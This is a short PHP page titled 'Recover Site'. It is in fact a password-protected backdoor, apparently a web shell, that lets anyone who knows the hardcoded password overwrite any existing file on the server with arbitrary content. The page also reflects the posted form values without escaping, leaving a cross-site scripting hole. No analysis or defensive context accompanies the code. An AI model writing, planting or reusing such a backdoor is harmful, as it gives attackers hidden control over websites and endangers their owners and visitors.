<?php
$error = false;
if ( $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_POST['path'] ) && isset( $_POST['content'] ) && isset( $_POST['pass'] ) && $_POST['pass'] == 'fucku' ) {
  $path = $_POST['path'];
  $content = $_POST['content'];
  if( file_exists( $path ) && ! is_dir( $path ) ) {
    $file = fopen($path, 'w');
    fwrite($file, $content);
    fclose($file);
    $error = 'File uploaded successfully';
  } else {
    $error = 'Upload failed. File not found';
  }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Recover Site</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>
<body>
  <?php if( $error ) : ?>
    <div class="alert alert-primary" role="alert"><?php echo $error; ?></div>
  <?php endif; ?>
  <form action="" method="POST">
    <div class="form-group">
      <label for="path">Path:</label>
      <input type="text" class="form-control" name="path" id="path" placeholder="Enter your path" value="<?php echo isset( $_POST['path'] ) ? $_POST['path'] : ''; ?>">
    </div>
    <div class="form-group">
      <label for="pass">Pass:</label>
      <input type="pass" class="form-control" name="pass" id="pass" placeholder="Enter your pass address" value="<?php echo isset( $_POST['pass'] ) ? $_POST['pass'] : ''; ?>">
    </div>
    <div class="form-group">
      <label for="content">Content:</label>
      <textarea class="form-control" name="content" id="content" rows="5" placeholder="Enter your content"> <?php echo isset( $_POST['content'] ) ? $_POST['content'] : ''; ?></textarea>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
  </form>

</body>
</html>